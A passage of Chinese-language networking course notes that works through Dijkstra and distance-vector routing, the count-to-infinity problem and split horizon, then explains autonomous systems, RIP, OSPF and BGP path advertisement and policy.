<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606092930.png" /></p>
<ol start="14" type="1">
<li>从临时节点中找到代价最小的节点D，将其变成永久节点，算法结束</li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606092951.png" /></p>
<p>其实可以将算法中的2，3两个步骤合为1各步骤。下面用表格表示：</p>
<table style="width:100%;">
<colgroup>
<col style="width: 4%" />
<col style="width: 18%" />
<col style="width: 10%" />
<col style="width: 10%" />
<col style="width: 10%" />
<col style="width: 10%" />
<col style="width: 10%" />
<col style="width: 10%" />
<col style="width: 10%" />
</colgroup>
<thead>
<tr class="header">
<th>step</th>
<th>N'</th>
<th>B节点标记</th>
<th>C节点标记</th>
<th>D节点标记</th>
<th>E节点标记</th>
<th>F节点标记</th>
<th>G节点标记</th>
<th>H节点标记</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>0</td>
<td>A</td>
<td>2,A</td>
<td>∞</td>
<td>∞</td>
<td>∞</td>
<td>∞</td>
<td>6,A</td>
<td>∞</td>
</tr>
<tr class="even">
<td>1</td>
<td>A,B</td>
<td>2,A</td>
<td>9,B</td>
<td>∞</td>
<td>4,B</td>
<td>∞</td>
<td>6,A</td>
<td>∞</td>
</tr>
<tr class="odd">
<td>2</td>
<td>A,B,E</td>
<td>2,A</td>
<td>9,B</td>
<td>∞</td>
<td>4,B</td>
<td>6,E</td>
<td>5,E</td>
<td>∞</td>
</tr>
<tr class="even">
<td>3</td>
<td>A,B,E,G</td>
<td>2,A</td>
<td>9,B</td>
<td>∞</td>
<td>4,B</td>
<td>6,E</td>
<td>5,E</td>
<td>9,G</td>
</tr>
<tr class="odd">
<td>4</td>
<td>A,B,E,G,F</td>
<td>2,A</td>
<td>9,B</td>
<td>∞</td>
<td>4,B</td>
<td>6,E</td>
<td>5,E</td>
<td>8,F</td>
</tr>
<tr class="even">
<td>5</td>
<td>A,B,E,G,F,H</td>
<td>2,A</td>
<td>9,B</td>
<td>10,H</td>
<td>4,B</td>
<td>6,E</td>
<td>5,E</td>
<td>8,F</td>
</tr>
<tr class="odd">
<td>6</td>
<td>A,B,E,G,F,H,C</td>
<td>2,A</td>
<td>9,B</td>
<td>10,H</td>
<td>4,B</td>
<td>6,E</td>
<td>5,E</td>
<td>8,F</td>
</tr>
<tr class="even">
<td>7</td>
<td>A,B,E,G,F,H,C,D</td>
<td>2,A</td>
<td>9,B</td>
<td>10,H</td>
<td>4,B</td>
<td>6,E</td>
<td>5,E</td>
<td>8,F</td>
</tr>
</tbody>
</table>
<p>两者的结果是一样的，只是表示形式不一样。最后输出的汇集树如下：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606094522.png" /></p>
<p>原理其实很简单。先具体一点，A到达B有且只有两种方式，A直接到达B，或者A通过其他节点到达B。A走到G的代价大于B，所以通过G再经过其他节点到达B的代价远大于直接到达。因此选择直达。</p>
<p>同样的道理，我们将其抽象。从N'到达临时节点中的某一个节点只有两种方法，一种是N'中某个节点可以直接到达，另一种是先到达临时节点中的其他节点，通过该节点到达。假设我们需要到达临时节点K（当前直连代价最小的节点），如果存在一条路径，可以经过另一个临时节点J，然后在经过0或者多个节点到达K，并且代价比直连小。那么N'到达J的代价就会小于到达K的代价，那么K的当前直连代价就不是最小，与假设相悖。因此，每次从临时节点中找的直连代价最小的节点，并将其加入永久节点，那么该节点的最短路径就已确定。</p>
<p>Dijkstra的算法复杂度为 <span class="math inline">\(O(n^2)\)</span>
，可以有效的实现，使时间复杂度降为 <span
class="math inline">\(O(nlog_2n)\)</span></p>
<h2 id="distance-vector-routing">1.3. Distance Vector Routing</h2>
<p>距离矢量路由选择的基本思想：</p>
<ul>
<li>各路由器维护一张路由表，结构如图</li>
</ul>
<table>
<thead>
<tr class="header">
<th>To</th>
<th>Next hop</th>
<th>cost</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>A</td>
<td>Z</td>
<td>14</td>
</tr>
<tr class="even">
<td>...</td>
<td>...</td>
<td>...</td>
</tr>
</tbody>
</table>
<ul>
<li>各路由器<strong>只</strong>与相邻路由器交换路由表</li>
<li>根据从邻居获得的路由信息，更新自己的路由表</li>
</ul>
<p>举个简单点的例子：（刚开始的时候所有路由表都为空）</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606111120.png" /></p>
<ol type="1">
<li>第一个周期：所有路由器发分组给邻居“我是xx，你是谁？”，邻居收到之后回复“收到，我是XX”（本质上也是路由表的交互，只不过刚开始的时候路由表为空，因此只能从分组中得到IP）。通过这样的一次交互，所有路由器就知道了邻居的消息，就有了基本的路由表（表项只有关于邻居的）。A的路由表如下：</li>
</ol>
<table>
<thead>
<tr class="header">
<th>To</th>
<th>Next hop</th>
<th>cost</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>B</td>
<td>B</td>
<td>10</td>
</tr>
<tr class="even">
<td>D</td>
<td>D</td>
<td>16</td>
</tr>
</tbody>
</table>
<ol start="2" type="1">
<li>第二个周期：所有路由器与邻居交换路由表，B告诉A“到C的分组给我，我到C的代价是22”，D告诉A“到C的分组给我，我到C的代价只要5”。A收到这样的信息之后，通过计算：<span
class="math inline">\(d_A(C)=min(\ d_A(B)+d_B(C),\quad d_A(D)+d_D(C)\
)=min(10+22, 16+5)=21,\quad 其中 d_A(C) 表示A到C的最小代价\)</span>
因此，A更新自己的路由表：</li>
</ol>
<table>
<thead>
<tr class="header">
<th>To</th>
<th>Next hop</th>
<th>cost</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>B</td>
<td>B</td>
<td>10</td>
</tr>
<tr class="even">
<td>D</td>
<td>D</td>
<td>16</td>
</tr>
<tr class="odd">
<td>C</td>
<td>D</td>
<td>21</td>
</tr>
</tbody>
</table>
<p>该过程中用到了一个公式，这个公式就是 Bellman-Ford
方程（动态规划）</p>
<p><span class="math display">\[
\begin{array}{l}
设\ d_x(y) \ 表示从x到y的最小路径代价，那么: \\ \\
d_x(y) = min_v\{c(x,v)+d_v(y)\} \\ \\
其中，c(x,v)：x到邻居v的代价；v是x的所有邻居中代价最小的
\end{array}
\]</span></p>
<p><strong>核心思路</strong>：</p>
<ul>
<li>定时或者DV发生变化时，每个节点都将自己的距离矢量估计值传送给邻居，让对方自己算</li>
<li>当x从邻居收到DV时，自己运算（B-F方程），更新它自己的距离矢量</li>
</ul>
<p>DV算法是一个异步的、迭代算法：每次本地迭代都会被以下事件触发：</p>
<ul>
<li>本地链路（与自己相连的链路）代价发生变化</li>
<li>从邻居来了DV的更新消息</li>
</ul>
<p>DV算法还是分布式的，每个节点只是在自己的DV改变之后向邻居通告：</p>
<ul>
<li>邻居们在<strong>有必要的情况</strong>再通知它们的邻居</li>
</ul>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606114933.png" /></p>
<h3 id="无穷计算问题">1.3.1. 无穷计算问题</h3>
<p>DV算法的特点有两点：</p>
<ol type="1">
<li>好消息传得快：好消息得传播以每一个周期前进一个路由器得速度进行</li>
<li>坏消息传得慢：无穷计算问题</li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606115234.png" /></p>
<p>如上图，假设代价为跳数。那么B，C，D得路由表中，关于A得代价都是∞，即A不可达。这时候，A与B之间可达了，变成下图</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606115326.png" /></p>
<p>A可达这就是一个好消息，接下来分析一下过程：</p>
<table>
<thead>
<tr class="header">
<th>周期</th>
<th>B到A</th>
<th>C到A</th>
<th>D到A</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>初始</td>
<td>∞,-</td>
<td>∞,-</td>
<td>∞,-</td>
</tr>
<tr class="even">
<td>1</td>
<td>1,A</td>
<td>∞,-</td>
<td>∞,-</td>
</tr>
<tr class="odd">
<td>2</td>
<td>1,A</td>
<td>2,B</td>
<td>∞,-</td>
</tr>
<tr class="even">
<td>3</td>
<td>1,A</td>
<td>2,B</td>
<td>3,C</td>
</tr>
</tbody>
</table>
<p>3个周期之后，整个网络就知道了这个好消息。</p>
<p>但是如果是坏消息呢？接着上面的分析，3个周期之后，A可到的消息整个网络都知道了，忽然A又不可达了</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606115234.png" /></p>
<p>这时候的过程如下：</p>
<table>
<thead>
<tr class="header">
<th>周期</th>
<th>B到A</th>
<th>C到A</th>
<th>D到A</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>初始</td>
<td>1,A</td>
<td>2,B</td>
<td>3,C</td>
</tr>
<tr class="even">
<td>1</td>
<td>3,C</td>
<td>2,B</td>
<td>3,C</td>
</tr>
<tr class="odd">
<td>2</td>
<td>3,C</td>
<td>4,B</td>
<td>3,C</td>
</tr>
<tr class="even">
<td>3</td>
<td>5,C</td>
<td>4,B</td>
<td>5,C</td>
</tr>
<tr class="odd">
<td>4</td>
<td>5,C</td>
<td>6,B</td>
<td>5,C</td>
</tr>
<tr class="even">
<td>5</td>
<td>7,C</td>
<td>6,B</td>
<td>7,C</td>
</tr>
<tr class="odd">
<td>6</td>
<td>7,C</td>
<td>8,B</td>
<td>7,C</td>
</tr>
<tr class="even">
<td>...</td>
<td>...</td>
<td>...</td>
<td>...</td>
</tr>
<tr class="odd">
<td>n</td>
<td>∞</td>
<td>∞</td>
<td>∞</td>
</tr>
</tbody>
</table>
<p>这个坏消息要经过非常多的周期之后，网络中才会知道A真的不可达了。</p>
<p>解释一下：</p>
<ol type="1">
<li>第一个周期，B检测到A不可达，但是C告诉B和D“你给我，我到A只要2跳”，B就信了，因此将自己到A的代价改为3。（B和D的变化是一样的，因此后面只说B）</li>
<li>第二个周期，B，C，D向邻居发送上一个周期算出来的路由表，B一看“C到A2跳”，因此不做修改；但是C看到B的路由表“B到A要3跳”，因此将自己修改为4</li>
<li>第三个周期，B，C，D向邻居发送上一个周期算出来的路由表，B一看“C到A为4跳”，就把自己修改为5；C看到B的路由表没变，因此没修改</li>
<li>第4个周期，B，C，D向邻居发送上一个周期算出来的路由表，B一看“C到A为4跳”，所以没修改；C看到B的路由表“B到A需要5跳”，因此将自己修改为6</li>
<li>依此类推，要非常多个周期之后（代价到达一个上限或者age为0）整个网络才知道A不可达，才将到A的代价修改为∞</li>
</ol>
<p><strong>根据上面的过程分析：最开始的时候C告诉B“你给我，我到A只要2跳”，但是C是通过B到达A的，也就是B是C的下一跳。因此，C不应该跟B这么说，应该说“我到A要2跳，但是下一跳就是B”，B收到这样的信息就知道“A应该不可达了”，变将自己修改为∞。下一个周期，B将整个信息告诉C；每过一个周期，就会有一个节点知道A不可达这个坏消息。</strong></p>
<p>上面的思路是解决无穷计算问题的一个方法：水平分裂(split
horizon)算法</p>
<h3 id="水平分裂算法">1.3.2. 水平分裂算法</h3>
<p>还是以上面的例子为例，使用水平分裂算法的过程为：</p>
<table>
<thead>
<tr class="header">
<th>周期</th>
<th>B到A</th>
<th>C到A</th>
<th>D到A</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>初始</td>
<td>1,A</td>
<td>2,B</td>
<td>3,C</td>
</tr>
<tr class="even">
<td>1</td>
<td>∞,-</td>
<td>2,B</td>
<td>3,C</td>
</tr>
<tr class="odd">
<td>2</td>
<td>∞,-</td>
<td>∞,-</td>
<td>3,C</td>
</tr>
<tr class="even">
<td>3</td>
<td>∞,-</td>
<td>∞,-</td>
<td>∞,-</td>
</tr>
</tbody>
</table>
<p>这个算法的核心在于邻居的身份：</p>
<ul>
<li>如果邻居就是下一跳：如实告诉邻居，我到xx不可达，我是通过你到达的</li>
<li>如果邻居不是下一跳：就告诉邻居自己的路由表</li>
</ul>
<p>这就是分裂，遇到不同的邻居说不同的话，看起来像是人格分裂。但是该算法只能减缓无穷计算问题，而不能杜绝，当网络存在环的时候，该算法可能就失效了。下面举一个例子：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606121724.png" /></p>
<p>过程如下：</p>
<table>
<thead>
<tr class="header">
<th>周期</th>
<th>A到D</th>
<th>B到D</th>
<th>C到D</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>初始</td>
<td>2,C</td>
<td>2,C</td>
<td>1,D</td>
</tr>
<tr class="even">
<td>1</td>
<td>2,C</td>
<td>2,C</td>
<td>∞,-</td>
</tr>
<tr class="odd">
<td>2</td>
<td>3,B</td>
<td>3,A</td>
<td>∞,-</td>
</tr>
<tr class="even">
<td>3</td>
<td>∞,-</td>
<td>∞,-</td>
<td>4,A</td>
</tr>
<tr class="odd">
<td>4</td>
<td>∞,-</td>
<td>5,C</td>
<td>∞,-</td>
</tr>
<tr class="even">
<td>5</td>
<td>6,B</td>
<td>∞,-</td>
<td>∞,-</td>
</tr>
<tr class="odd">
<td>6</td>
<td>∞,-</td>
<td>∞,-</td>
<td>7,A</td>
</tr>
<tr class="even">
<td>7</td>
<td>∞,-</td>
<td>8,C</td>
<td>∞,-</td>
</tr>
<tr class="odd">
<td>8</td>
<td>9,B</td>
<td>∞,-</td>
<td>∞,-</td>
</tr>
<tr class="even">
<td>...</td>
<td>...</td>
<td>...</td>
<td>...</td>
</tr>
<tr class="odd">
<td>n</td>
<td>∞,-</td>
<td>∞,-</td>
<td>∞,-</td>
</tr>
</tbody>
</table>
<p>解释：</p>
<ol type="1">
<li>A和B没有变化，但是两者告诉C，“我不能直达D，你是我的下一跳”，而C检测到无法到达D，则设置为
∞</li>
<li>C告诉A，B“我无法到达D”。A，B虽然告诉C“我不能直达D，你是我的下一跳”，但互相告诉对方“我可以到达”，因此A，B修改对方为自己的下一跳，而C还是∞</li>
<li>C告诉A，B“我无法到达D”。B告诉A“我不能直达D，你是我的下一跳”，同样的A也给B类似的信息，所以A，B都修改为∞。但是A，B告诉C，“我可以到达D”，因此C修改为4，A（或者4，B。选择不一样，后面的结果也不一样）</li>
<li>C告诉B“我可以到达D”，因此B修改为5,C。C告诉A“我无法直达D，你是我的下一跳”，因此A还是无穷。A告诉C“自己到不了D”，于是C修改为∞</li>
<li>B告诉A“可以到达D”，A修改为6，B。C和A都告诉B“到达不了D”，于是B修改为∞。C还是无穷</li>
</ol>
<p>3,4,5一个循环和6,7,8另一个循环。后面会一直这样的循环，A，B，C三者中总有一个有着"假消息"。最终代价值达到上限，坏消息才全网知道。</p>
<h2 id="ls和dv对比">1.4. LS和DV对比</h2>
<ol type="1">
<li>消息复杂度：DV简单
<ul>
<li>LS需要泛洪，每个节点都需要（局部的信息，全局传播）</li>
<li>DV只需要周期性和邻居交换信息（全局的信息，局部传播）</li>
</ul></li>
<li>收敛时间：LS更快
<ul>
<li>LS不需要周期，一段时间后就能获得网络的全部信息。然后根据dijkstra得出汇集树。但可能存在震荡</li>
<li>DV需要周期性从邻居获得消息，收敛慢。可能存在无穷计算(count-to-infinity)问题</li>
</ul></li>
<li>健壮性：LS更健壮
<ul>
<li>LS：某个节点出问题了，只会影响局部。该节点以及周边节点执行dijkstra时候影响很大，但对远一点的节点影响就小了，有可能只是不能到达坏节点的局部地区的节点。</li>
<li>DV：坏节点告诉邻居，自己很nb，到哪都是1。邻居信了，也告诉它们的邻居“给我，我邻居超nb，到哪都是1”。这样子，所有的节点都会相信（好消息传得快嘛🤡）把分组都交给坏节点，全网崩溃。</li>
</ul></li>
</ol>
<p>这样子对比，2种算法各有优缺点，在互联网上都有应用。</p>
<h1 id="路由选择协议">2. 路由选择协议</h1>
<p>本节讲的是实现路由选择的协议，上一节讲的是路由选择算法。算法是一种思路，协议是具体的实现。</p>
<p>首先介绍一下什么是自治系统（autonomous system,
AS）。在互联网中，<strong>一个自治系统(AS)是一个有权自主地决定在本系统中应采用各种路由协议的小型单位</strong>。这个网络单位可以是一个简单的网络也可以是一个由一个或多个普通的网络管理员来控制的网络群体，它是一个单独的可管理的网络单元（例如一所大学，一个企业或者一个公司个体）。一个自治系统有时也被称为是一个路由选择域（routing
domain）。一个自治系统将会分配一个全局的唯一的16位号码，有时我们把这个号码叫做自治系统号（ASN）。</p>
<p>如果没有AS，那么所有的路由器都在一个层面上：</p>
<ul>
<li>一个网络中的所有路由器地位相等</li>
<li>LS、DV或者其他路由算法，所有路由器都要知道到其他路由器该怎么走</li>
<li>所有路由器在一个平面</li>
</ul>
<p>这会导致以下问题：</p>
<ol type="1">
<li>在规模巨大的网络中，路由信息的存储、传输和计算代价巨大（比如几百万个路由器，一个路由表的表项就有上百万个）
<ul>
<li>DV：距离矢量很大。体现在表项多，代价大</li>
<li>LS：几百万个节点的LS分组在网络内泛洪，Dijkstra算法实现的的复杂度</li>
</ul></li>
<li>管理层面的问题：
<ul>
<li>不同的网络所有者希望按照自己的方式管理网络</li>
<li>希望对外隐藏自己网络的拓扑</li>
<li>最重要的是要与其他网络互联</li>
</ul></li>
</ol>
<p>因此，需要层次化路由。将互联网分成一个个AS：</p>
<ul>
<li>某个区域内的路由器集合称为AS</li>
<li>一个AS用AS number(ASN) 唯一标识</li>
<li>一个ISP可能包括一个或多个AS</li>
</ul>
<p>层次化之后，路由也分为了2个层次的路由：</p>
<ol type="1">
<li>AS内部路由：
<ul>
<li>同一个AS内部路由器运行的路由协议相同，称为内部网关协议(intra-AS
routing protocol)</li>
<li>不同的AS可能运行着<strong>不同的</strong>内部网关协议，如RIP，OSPF</li>
<li><strong>网关路由器</strong>：AS边缘路由器，可以连接到其他AS</li>
<li>AS内部路由对外表现为一个网关路由器</li>
</ul></li>
<li>AS间路由：
<ul>
<li>运行<strong>统一的</strong>外部网关协议(inter-AS routing
protocol)</li>
<li>只解决AS之间的路由问题，完成AS之间的互联互通</li>
</ul></li>
</ol>
<p>层次路由的优点就是：</p>
<ol type="1">
<li>内部网关协议解决了AS内部数量有限的路由器相互到达的问题，AS内部规模可控，如果节点多了，就分成两个AS</li>
<li>AS之间的路由规模问题被解决：
<ul>
<li>增加一个AS，对于AS之间路由来说就是增加了一个节点</li>
<li>对于其他AS来说就是多了一个表项</li>
<li>扩展性强：规模增大，性能不会减的太多</li>
</ul></li>
<li>管理方便：
<ul>
<li>各个AS运行不同的内部网关协议</li>
<li>可以让自己的网络细节不向外透露</li>
</ul></li>
</ol>
<h2 id="内部网关协议">2.1. 内部网关协议</h2>
<h3 id="riprouting-information-protocol">2.1.1. RIP(Routing Information
Protocol)</h3>
<p>RIP协议的实现是基于DV算法：</p>
<ul>
<li>距离矢量：每条链路的cost=1， 最大hops为15</li>
<li>DV每隔30s和邻居交换DV，称为<strong>路由通告</strong>
<ul>
<li>定期发送通告报文，或者</li>
<li>在对方的请求下可以也可以发送通告报文</li>
</ul></li>
<li>每个通告包括：AS内部最多25个目标<strong>子网</strong>的DV，包括目标网络以及跳数</li>
</ul>
<p>举一个例子：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606145442.png" /></p>
<p>上图中，给出了AS内部的网络拓扑以及D路由器的路由表。接下来，A发送给D距离矢量如下：</p>
<table>
<thead>
<tr class="header">
<th>dest</th>
<th>next</th>
<th>hops</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>w</td>
<td>-</td>
<td>1</td>
</tr>
<tr class="even">
<td>x</td>
<td>-</td>
<td>1</td>
</tr>
<tr class="odd">
<td>z</td>
<td>C</td>
<td>4</td>
</tr>
<tr class="even">
<td>...</td>
<td>...</td>
<td>...</td>
</tr>
</tbody>
</table>
<p>D收到这样一个距离矢量后，分析：</p>
<ul>
<li>到达w网络，我的下一跳就是A，并且跳数也没有改变，因此不做修改</li>
<li>到达x网络，我可以直接到达，也不需要改变</li>
<li>到达z网络，我到达A需要1跳，A到达z需要4跳，那么我通过A到达z只需要5跳，比现在的代价要少，因此会做出修改</li>
</ul>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606145749.png" /></p>
<p><strong>RIP：链路失效和恢复</strong>：如果180s（6个周期）没有收到通告信息，那么就说明邻居或者链路失效，此时的action如下：</p>
<ol type="1">
<li>发现邻居或者链路失效</li>
<li>将新的通告报文传递给其他邻居</li>
<li>邻居因此发出新的通告（如果自己的路由产生了变化）</li>
<li>链路失效在全AS中传输（也不一定，因为DV的无穷计算问题）</li>
<li>使用水平分裂（也叫做毒性逆转 poison
reverse）一定程度上缓解无穷计算问题，并且使用最大跳数上限来限制环路情况下的问题</li>
</ol>
<p>接下来就是RIP比较诡异的特点：</p>
<ul>
<li><strong>RIP以应用进程的方式实现：route-d(daemon)</strong></li>
<li>通告报文通过UDP报文发送，周期性重复</li>
</ul>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606150301.png" /></p>
<p>总结来说：一个网络层的协议使用了传输层的服务，以应用层实体的方式实现。（下层的协议使用了依赖上层实现）</p>
<h3 id="ospfopen-shortest-path-first">2.1.2. OSPF(Open Shortest Path
First)</h3>
<p><strong>OSPF协议使用了LS算法</strong>：</p>
<ul>
<li>LS分组在AS中分发</li>
<li>全局网络（AS）拓扑、代价在每一个节点中保存</li>
<li>路由计算采取Dijkstra算法</li>
<li>OSPF通告信息中携带：每一个邻居路由器一个表项。</li>
<li>通告信息传遍整个AS</li>
<li>在<strong>IP数据报</strong>上直接传送OSPF报文</li>
</ul>
<p>IS-IS路由协议：和OSPF几乎一致</p>
<p><strong>OSPF的“高级”特性（RIP没有的特性）</strong>：</p>
<ul>
<li>安全：所有的OSPF报文都经过认证</li>
<li>允许有多个代价相同的路径存在（RIP中只能存在一个），这样有利于负载均衡</li>
<li>对于每一个链路，有多重代价矩阵。这样做的优势
<ul>
<li>支持按照不同的代价计算最优路径</li>
</ul></li>
<li>对单播和多播的集成支持：
<ul>
<li>multicast OSPF(MOSPF)使用相同的拓扑数据库，就像是OSPF一样</li>
</ul></li>
<li>在大型网络中支持<strong>层次性</strong>OSPF</li>
</ul>
<p>层次化OSPF路由如下：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606151001.png" /></p>
<p>将一个AS分为两个级别的层次：本地和骨干</p>
<ul>
<li>链路状态通告仅在本地区域内进行</li>
<li>每一个节点拥有本地区域的拓扑信息。关于其他区域，只知道去它的方向</li>
</ul>
<p>路由器也分为4类：</p>
<ol type="1">
<li>普通路由器：仅仅在本地区域内运行OSPF路由</li>
<li>骨干路由器：仅仅在骨干区域内运行OSPF路由</li>
<li>区域边界路由器：“聚集”到自己区域内网络的距离，向其他区域边界路由器通告</li>
<li>边界路由器：连接其他AS</li>
</ol>
<p>个人理解：大型AS内部路由器太多，如果对路由器进行OSPF，路由表的表项会比较的多，因此将几个<strong>路由器</strong>抽象成一个<strong>区域边界路由器</strong>。对于子网来说，子网内的主机都由路由器管理；对于区域边界路由器来说，区域内的所有路由器都由它管理。<strong>进一步抽象</strong>。因此，想要跨区域只需要通过骨干执行OSPF就知道，如果不跨区域，在本地区域内执行OSPF就可以了。</p>
<p>类比：</p>
<table>
<thead>
<tr class="header">
<th>internet</th>
<th>AS</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>ISP</td>
<td>backbone</td>
</tr>
<tr class="even">
<td>ISP内路由器</td>
<td>backbone路由器</td>
</tr>
<tr class="odd">
<td>子网</td>
<td>area</td>
</tr>
<tr class="even">
<td>子网出口路由器</td>
<td>边界区域路由器</td>
</tr>
<tr class="odd">
<td>子网内的主机</td>
<td>area路由器</td>
</tr>
<tr class="even">
<td>ISP到Internet的路由器</td>
<td>边界路由器</td>
</tr>
</tbody>
</table>
<p>这样做的好处：</p>
<ul>
<li>每个路由器的表项少了</li>
<li>计算复杂性下降</li>
<li>获得网络大致信息的时间减少了</li>
</ul>
<h2 id="外部网关协议bgp">2.2. 外部网关协议：BGP</h2>
<p>BGP(Border Gateway Protocol)：AS之间路由协议“事实上的”标准 -&gt;
“将互联网各个AS粘在一起的胶水”</p>
<p>BGP提供给每个AS以下方法：</p>
<ol type="1">
<li>eBGP(External BGP)：从相邻的AS处获得子网可达信息</li>
<li>iBGP(Internal BGP)：将获得子网可达信息传遍AS内部的所有路由器</li>
<li>根据子网可达信息和<strong>策略</strong>来决定到达子网的“好”路径</li>
</ol>
<p>BGP基于SV算法，但是改进版的（可以认为是<strong>路径矢量</strong>），解决了环路问题。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606182240.png" /></p>
<p>解释：1c收集AS1内所有路由信息（通过内部网关协议）然后告诉给2a（通过eBGP），2a再将信息告诉AS2内所有路由器（iBGP）。2c收集AS2内所有路由信息，包括1c告诉给2a的信息（内部网关协议），然后将收集到的信息告诉给3a（eGBP），3a将信息告诉给AS3内所有路由器（iBGP）。</p>
<p>上面描述的是大概的一个过程。</p>
<h3 id="bgp基础">2.2.1. BGP基础</h3>
<p>BGP会话：2个BGP路由器在一个半永久的TCP连接上交换BGP报文：<strong>通告不同目标子网前缀的“路径”（注意不是距离）</strong></p>
<p>举个例子：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606182849.png" /></p>
<p>AS3中加了一个路由器X，然后需要告知给其他AS，因此3a通过eGBP向2c发送一个BGP报文，内容大致为“AS3，X”。2c再将这条信息稍作修改（3a，cost），然后转发。这样子AS2内的主机就知道如何到达X，并且因为报文中带的是路径，如果有环路就能够看出来，然后将其丢弃。因此就解决了DV的环路问题。</p>
<p>BGP路由的重要信息：</p>
<ul>
<li>当通告一个子网前缀时，通告包含BGP属性：<code>prefix + attributes = route</code></li>
<li>2个重要属性：
<ul>
<li><strong>AS-PATH</strong>：前缀的通告所经过的AS列表：AS3,AS6,...
<ul>
<li>检测环路</li>
<li>多路径选择</li>
<li>在向其他AS转发时，需要将自己的AS号加在路径上</li>
</ul></li>
<li><strong>NEXT-HOP</strong>：从当前AS到下一跳AS有多个链路，在NEXT-HOP属性中，告诉对方通告哪个转发</li>
<li>其他属性：路由偏好指标</li>
</ul></li>
<li>基于<strong>策略</strong>的路由：
<ul>
<li>当一个网络路由器接收到了一个路由通告，使用<strong>输入策略</strong>来接收/过滤</li>
<li>策略也决定了是否向它的邻居通告收到的这个路由信息</li>
<li>策略：政治因素、经济因素等</li>
</ul></li>
</ul>
<blockquote>
<p>AS内部一般属于同一个机构/企业/组织，所以通信应该是“无话不说”的，都是自己人；而AS之间相当于两个企业，一个AS要从另一个AS之间穿过到达目标AS，需要考虑：分组会不会被拦截，信息是否会泄露等信息。因此需要有一定的策略，而不在关注性能。</p>
</blockquote>
<h3 id="bgp路径通告">2.2.2. BGP路径通告</h3>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606184830.png" /></p>
<ul>
<li>路由器AS.2c 从 AS3.3a 收到 “AS3,X” 路由通告（eBGP）</li>
<li>基于AS2的输入策略，AS.2c决定接收该通告，而且通告iBGP向AS2内所有路由器通告</li>
<li>基于AS2的策略，AS2路由器2a通告eBGP向AS1.1c通告 “AS2,AS3,X”
<ul>
<li>AS-PATH加上了AS2自己这一跳</li>
</ul></li>
</ul>
<p>当然，也有可能AS3和AS1也有路径</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606185101.png" /></p>
<ul>
<li>AS1.1c会从AS3.3a收到 “AS3，X”；会从AS2.2a收到 “AS2,AS3,X”；</li>
<li>基于AS1的策略，AS1路由器可以选择不同的路径。比方说AS2是敌对公司的，那么就会选择上面那条路径</li>
</ul>
<p>那么请问AS内的路由器对于X的表项该如何表示呢？假设1d右边的接口为1，左边的接口为2，那么1d的路由表可以为：</p>
<table>
<thead>
<tr class="header">
<th>dest</th>
<th>interface</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>...</td>
<td>...</td>
</tr>
<tr class="even">
<td>X</td>
<td>1</td>
</tr>
<tr class="odd">
<td>...</td>
<td>...</td>
</tr>
</tbody>
</table>
<p>这样子，如果1d需要给X发送分组，只需要将分组从接口1转发就可以了。</p>
<h3 id="bgp报文">2.2.3. BGP报文</h3>
<ul>
<li>使用TCP协议交换BGP报文</li>
<li>BGP报文包括：
<ul>
<li>OPEN：打开TCP连接，认证发送方</li>
<li>UPDATE：通告新路径（或者撤销原路径）</li>
<li>KEEP ALIVE：在没有更新时保持连接，也用于对OPEN的确认</li>
<li>NOTIFICATION：通告以前消息的错误，也用来关闭连接</li>
</ul></li>
</ul>
<h3 id="bgp路径选择">2.2.4. BGP路径选择</h3>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606185722.png" /></p>
<h4 id="热土豆路由">2.2.4.1. 热土豆路由</h4>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606185821.png" /></p>
<h4 id="通过路径通告执行策略">2.2.4.2. 通过路径通告执行策略</h4>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606185923.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606185955.png" /></p>
<h2 id="内部和外部网关协议的对比">2.3. 内部和外部网关协议的对比</h2>
<p>内部和外部网关协议有许多的不同，<strong>归根结底是因为AS内是属于一个机构的，而不同AS是分属于不同机构的。</strong></p>
<p><strong>策略</strong>：</p>
<ul>
<li>Inter-AS：管理员需要控制通信路径，谁在使用它的网络进行数据传输</li>
<li>Intra-AS：属于同一个机构，无需政策。AS内部的各子网的主机尽可能地利用资源进行快速路由</li>
</ul>
<p><strong>规模</strong>：</p>
<ul>
<li>AS间路由必须考虑规模问题，一遍支持全网的数据转发</li>
<li>AS内部就不需要考虑规模
<ul>
<li>如果AS太大，切成两个AS就好了</li>
